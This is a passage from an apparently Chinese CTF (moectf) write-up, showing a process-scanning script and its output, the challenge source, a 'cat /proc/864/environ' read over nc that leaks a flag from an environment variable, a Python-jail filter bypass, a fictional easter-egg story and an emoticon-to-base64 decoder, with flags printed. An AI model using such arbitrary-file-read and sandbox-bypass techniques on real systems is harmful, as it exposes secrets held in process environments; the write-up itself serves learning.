&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(f&amp;quot;Found interesting info in PID {pid}: {response}&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[x] Opening connection to 127.0.0.1 on port 41503: Trying 127.0.0.1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Opening connection to 127.0.0.1 on port 41503: Done
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b&amp;#39;Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!\n&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Found interesting info in PID 1: b&amp;#39;(yourcat) sh\x00startup2.sh\x00\n&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Found interesting info in PID 864: b&amp;#39;(yourcat) python\x00&#x2F;problem&#x2F;doggy.py\x00flag{HIDDEN}\x00\n&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Found interesting info in PID 866: b&amp;#39;(yourcat) socat\x00tcp-l:9999,fork,reuseaddr\x00exec:python yourcat.py\x00\n&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过扫进程可以发现有 3 个文件，分别是 &lt;code&gt;startup2.sh&lt;&#x2F;code&gt; 、&lt;code&gt;doggy.py&lt;&#x2F;code&gt; 和 &lt;code&gt;yourcat.py&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;yourcat.py&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from cmd import Cmd
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Application(Cmd):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    intro = (
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    prompt = &amp;quot;(yourcat) &amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def do_cat(self, arg: str):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;Print the contents of a file to the screen&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            with open(arg, &amp;quot;r&amp;quot;) as f:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                print(f.read())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        except:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;Error: could not open file&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def do_story(self, arg):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;Something you may want to know&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        with open(&amp;quot;story.md&amp;quot;, &amp;quot;r&amp;quot;) as f:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(f.read())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    Application().cmdloop()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;except KeyboardInterrupt:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(&amp;quot;\nGoodbye!&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;startup2.sh&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#!&#x2F;bin&#x2F;sh
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;python doggy.py $(cat &#x2F;flag) &amp;amp;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sleep 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;rm &#x2F;flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;socat tcp-l:9999,fork,reuseaddr exec:&amp;quot;python yourcat.py&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;exit 1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析可以知道这题会将 flag 藏在 &lt;code&gt;doggy.py&lt;&#x2F;code&gt; 运行时所在的进程环境变量中，并且会删除 &lt;code&gt;&#x2F;flag&lt;&#x2F;code&gt; 文件以免被找到，而在 &lt;code&gt;yourcat.py&lt;&#x2F;code&gt; 中还存在另外一条指令 &lt;code&gt;story&lt;&#x2F;code&gt;，这个最后我们再来说，先获取 flag ！&lt;&#x2F;p&gt;
&lt;p&gt;在扫描进程中，得知 &lt;code&gt;python &#x2F;problem&#x2F;doggy.py flag{HIDDEN}&lt;&#x2F;code&gt; 的 PID 为 864，那就通过 nc 连接来获取即可。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ nc localhost 41503
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(yourcat) cat &#x2F;proc&#x2F;864&#x2F;environ
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;HOSTNAME=369dd8706416SHLVL=3HOME=&#x2F;rootCATSFLAG=moectf{s8kfqY3s0Mm4MJQvDHnrRkeodETIkEYk}PATH=&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binPWD=&#x2F;problem
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;而之前说的 story 则是一个彩蛋哦，彩蛋如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 毛线球
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;（本文与解题无关，且均为虚构。）
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;## 一
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;狗子很喜欢毛线球。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;毛线球本来小小的，但是一拉，就能拉出很长很长的线出来。他搞不清人是怎么把这种东西缠起来的。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;当然，他也喜欢人类。人类对他很好。收留他，给他吃的、玩的，会放纵他做一些他自己都觉得过分的事情，比如玩毛线球，比如把主人的床当作猫砂盆使。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;他很喜欢地球，不过他知道他是时候走了。超波信号传来，他的母星被占领之前，最精英的那些逃脱了敌方的阻碍，在太空中漂泊。他要回去加入他们。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;但他直到最后都搞不清楚为什么自己会喜欢做一只在地球上的猫。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;## 二
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;收养自己的人比较奇怪。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;他知道这人叫作 ReverierXu，旁边人都喊他 rx。但他总觉得 rx 和别人的差别实在太大。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;比如按理来说，他活跃的时间，别人都是睡觉的，但 rx 就是不一样，总是在这些时候醒着，在地球人用的计算机器上面做着一些自己根本无法理解的东西。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;还有，上次自己被偷拍，生气之余对 rx 的相机施加了一些小小的压迫，竟然也被 rx 一眼看穿。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;是同类？绝对不可能。是人类口中的天才？不好说。但是，rx 旁边的人好像都把他叫作“神”。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;嘶，神吗……自己的母星上，好像也有一些信仰，把那些幻想中的至高无上的个体叫作“神”。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;没想到在地球上，竟然能看到真实存在的神啊……
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;## 三
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;地球和他的母星很不一样。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;与他的母星比起来，地球仿佛就像最原始的生命一样。没有其他星际文明的虎视眈眈，没有埋藏在人际当中的 FTL 文明的间谍（如果他自己不算的话）。人们甚至还在为了一点点想法的差异而大动干戈。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;很天真的文明，却又很幼稚。但对他来说，这种事情挺无所谓的。他很享受这里，至少不像在他的母星上，他需要时时刻刻为了下一代空间旅行技术奔波。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;挺蠢的，所谓下一代空间旅行技术，还不就是敌人来了怎么逃的问题。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;## 四
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;在被送入他自己研制的超空间传送装置时，他的上级这么对他说：
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;“那个星球的人很友好……尤其是对你将要暂时成为的生物而言。”
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;他不敢信，也不会信。所以 rx 怀抱着一只猫走进房间的那天，大家都看到了那只猫的使劲挣扎。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;大家凑近，笑着。他很恐惧，但竟没有人对他怎么样。听着自己听不懂的语言，感受着自己身上的抚摸，他发现自己的身体不太想挣扎了。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;人影散去，rx 为他铺张好猫砂盆和饮食器具，然后蹲在旁边看他吃饭。洛千站在旁边，和 rx 说笑着，他听不懂。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;但他突然就觉得，好像来之前的那人说的确实有那么点道理。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;超空间传输的能力毕竟有限，所以只能让他的母星上的一部分智慧生物转移到这颗星球。他希望他们都能这么幸运，找到一个能来养自己的人。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;## 五
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;他不想走。但是他还是得走了。空间旅行的专家不多，他是其中之一。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;超空间传送门已经在这个房间的一个角落打开，只要再过五分多钟就会关闭。只要经过这扇门，自己的外表就会恢复本来的模样，一个人类看到会讨厌的样子。不过也看不到了。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;但在离开前，他看到了房间中的毛线球。他踌躇了。犹豫了一会，他走过去，用爪推着毛线球，推到了自己回家的门前。然后他趴着，在离开前的最后五分钟，再感受一下地球。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;外面，rx 他们慌张的声音逐渐清晰。狗子定了定神，连人带球，一起走上了回家的路。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;原谅我带走一颗毛线球的自私，毕竟我真的很喜欢这里。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;## 最后
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;如果你发现了这个彩蛋，还请不要在群聊里透露，给大家留一个秘密（被我看见了我会撤回）。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;另外，校内的同学，如果你发现了这个彩蛋，还请务必私信管理的 ZeroAurora。我会考虑给前几个发现的送一点小东西的。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;gou-zi-6-xing-chen-zhi-mao&quot;&gt;狗子(6) 星尘之猫&lt;a class=&quot;zola-anchor&quot; href=&quot;#gou-zi-6-xing-chen-zhi-mao&quot; aria-label=&quot;Anchor link for: gou-zi-6-xing-chen-zhi-mao&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ nc cl.akarin.tk 10001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;gt;&amp;gt; flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;&amp;lt; moectf{this_is_not_the_real_flag_and_the_real_one_is_&amp;#39;flag.txt&amp;#39;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;gt;&amp;gt; next(open(&amp;#39;flag&amp;#39;+chr(46)+&amp;#39;txt&amp;#39;))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;&amp;lt; moectf{PLz_RemembeR_tHat_iowRaPPeR_is_iteRabLe_in_PytHon!_XTDpDES04OSu9}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;zdjd&quot;&gt;zdjd&lt;a class=&quot;zola-anchor&quot; href=&quot;#zdjd&quot; aria-label=&quot;Anchor link for: zdjd&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;AddOneSecondL&#x2F;zdjd_hoshino&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import base64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b64 = &amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+&#x2F;=&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;leftEye = [&amp;#39;o&amp;#39;, &amp;#39;0&amp;#39;, &amp;#39;O&amp;#39;, &amp;#39;Ö&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;mouth = [&amp;#39;w&amp;#39;, &amp;#39;v&amp;#39;, &amp;#39;.&amp;#39;, &amp;#39;_&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;rightEye = [&amp;#39;o&amp;#39;, &amp;#39;0&amp;#39;, &amp;#39;O&amp;#39;, &amp;#39;Ö&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;table = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;separator = &amp;#39; &amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def makeTable():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(4):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        for j in range(4):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            for k in range(4):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                table.append(leftEye[i] + mouth[j] + rightEye[k])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;makeTable()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def zdjd2human(t):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    arr = t.split(separator)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    lent = len(arr)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    resultArr = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(lent):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        c = arr[i]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if not c:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            continue
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        n = table.index(c)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if n &amp;lt; 0:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            raise ValueError(&amp;#39;Invalid zdjd code&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        resultArr.append(b64[n])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    t = &amp;#39;&amp;#39;.join(resultArr)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return t
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(zdjd2human(&amp;#39;Ö_o owO 0v0 Owo o.O O.O Ö.0 OwO ÖwO 0wO Ov0 OwO Ö.O ÖvÖ Ö.0 Ov0 o.O OvÖ 0w0 OvO o_0 O.Ö Öw0 Ö_0 Ö.O Ö.O O.0 owo ÖvÖ O.o Ö.0 Övo o_0 ÖvÖ 0w0 Ö_0 Övo ow0 Ov0 Ö.0 Öwo 0wÖ O_0 O.Ö o_o 0wÖ Ö.0 Övo Ö.o Ö.Ö Övo ovo Ö.O Ö.o o_0 O.o ÖvO owO 0_0 owO Ö_o 0wÖ Öv0 0wO o.O OwÖ Öw0 O.o Öw0 O.o 0.0 O_O Ö_0 Ö.o Ö.0 0v0 Öw0 Ö.O 0_0 0vÖ Övo owÖ Ov0 0_Ö Öv0 Ö.Ö O.0 0vÖ Ö.o 0vÖ 0.0 OwÖ ÖvÖ ÖvÖ o_0 0_0 ÖwO Ö.O Övo ovo o.O 0vo Ö.0 owo Öv0 ÖvÖ Öw0 Öwo Ö.0 Ö.O o.0 O_Ö o_o O.0 Ö.0 Öwo Ö.o Ö.O ov0 Öw0 Ö_o owÖ Ö.0 Ov0 o_0 Ö.O ov0 Ö.0 Öwo Ö.O o_0 owo o_o O.Ö 0.0 OvÖ Öw0 Ö.O 0_0 ÖvÖ Ö.0 Ö.Ö 0w0 O.O Ö_o owÖ Öv0 O.O Ö.0 O.o ov0 OvÖ ÖvÖ Ö.0 0.0 Ö.O ÖvO O.o Ow0 O_o Ö.O 0vo ov0 OvÖ o.Ö OwÖ Ö.0 0w0 o.O owÖ 0.0 O_Ö ÖvÖ Ö.0 O_0 Ö_0 Öw0 Ö.O O_0 0wO o_O Ö.o O_0 Övo Öw0 ow0 O_0 ÖwO Ö.0 Ö.O Ö.0 O.Ö Öv0 O.o Ö.0 Ö_0 o.Ö ow0 Ö.0 0wÖ OvO 0vO 0_0 0v0 o_O ÖvÖ 0.o 0wo o_0 O.O 0w0 0v0 O_o O.Ö Öv0 0w0 o.O Ö.O Ow0 0.0 o.Ö 0vO o_o 0wo ÖwO OvO Ov0 0wO o_O Ö.Ö Öv0 0v0 o_o OwO Ov0 0_Ö Ö_0 0wO Ov0 0.o Ö_o Ö.Ö Öw0 0.o O_o O.O o.0 0vO O_o OvO O_0 ovO o_0 Ö.O ov0 0vo o_0 Ö.O 0.0 0.0 Ö_o Ö.O Öv0 ow0 ÖwÖ OwO O_o 0wo o_0 owO 0w0 0.0 Ö_o owO 0wo 0wo Ö_o 0vO Ö.0 0vÖ o.O Ö.O ovo 0wo o_0 owO 0v0 owo o.O OvO Ov0 0wO Öw0 0wÖ Ovo ov0 Öwo ÖvÖ 0vo Owo Öw0 O.O Öw0 0vo Ö_0 0vO O_o O_O o.O Ö.Ö Ö_o ovO O_o O.Ö Öv0 0.o Ö_0 ÖvO Ov0 0v0 o.Ö 0vO Övo 0wo ÖwO OvO Ov0 0wO o_O Ö.Ö Öv0 0v0 o_o OwO Ov0 0_Ö Ö_0 0wO Ov0 0.o Ö_o Ö.Ö Öw0 0.o O_o O.O o.0 0vO O_o OvO O_0 0vo o_0 Ö.O Öv0 ow0 Ö_0 O.Ö Ö.o Ö_Ö O_o 0wO Ov0 owÖ o.O O.O 0v0 0wÖ o.O OvO Ov0 0wO Ö_0 Ö.O o_0 0.0 o.Ö 0wO Ov0 owÖ o.O Ö.Ö Öv0 0.o O_o OvÖ O_o owÖ Öwo 0vO O_0 0vO Öwo Ö.O Öv0 0w0 Öwo 0wÖ O_o Owo Öw0 Owo 0.o O_O o.O O.O 0v0 0_O o_0 OvÖ O.o ovO O_o O.O 0w0 0_Ö o_0 OwO Ov0 0vo o.Ö OwO Ov0 OvO o.O Ö.Ö Öv0 0wÖ o.Ö owO 0v0 0_O O_o O.O O.0 0vo Ö_0 O.Ö O_0 0v0 o_o owÖ Öw0 0v0 o_o OwO Ov0 0v0 o.Ö 0vO Öw0 0_Ö Ö_0 O.O Ö.o Ö_Ö OvO 0vO 0w0 0.0 o.Ö 0vÖ Övo OwO ÖwO 0wO Ov0 owo o.O O.O Ö.o 0wo o.Ö 0vO O.0 0_0 Ö_0 ÖvO Ov0 0_Ö Ö_0 0wO Ov0 0wÖ o_o 0vÖ 0v0 Owo o_0 O.O o.0 OwÖ o_O Ö.Ö Öw0 owo Ö_0 Ö.O owo 0wo o.O Ö.Ö Öwo 0wo O_o 0vO O_0 0_o O_O 0wO 0.o 0.O O_O 0vÖ Öw0 0.o O_o 0wo  &amp;#39;))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#Y2lwaGVyOiByWTVBaDhCdHNZWWF0TEVQdThZQ1BVMjJHcjVQUXQ4WUdES2t2YjRiazNENEpKZUVlNWtnQ3BvRXFnUnpzTTdtOWQ4akV0RTNMVW9LcFVMUW5NY3VBdW5VMWd0cHpDNWtTVXhGY3RGVE5DTVpWSExIWk5DbzVha3pLTVJZNWJieUJQN1JOVWVHREVZb1VjCmtleTogdGhlIHRhaWxpbmcgOCBieXRlcyBvZiBoYXNoIG9mICJ6dW5kdWppYWR1PyIgd2hpY2ggYmVnaW4gd2l0aCBiNjA5MTkwNGNkZmIKaXY6IHRoZSBlbmQgOCBieXRlcyBvZiBoYXNoIG9mICJkdWR1ZHU&#x2F;IiB3aGljaCBiZWdpbiB3aXRoIDI3MmJmMWRhMjIwNwoKaGludDE6IGhvdyBkbyBCaXRjb2luIGFkZHJlc3NlcyBlbmNvZGU&#x2F;CmhpbnQyOiB0aGUgbmFtZSBvZiBjcnlwdG9zeXN0ZW0gaXMgImJsKioqKnNoIg
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将上述代码进行 base64 解码可以得到内容如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
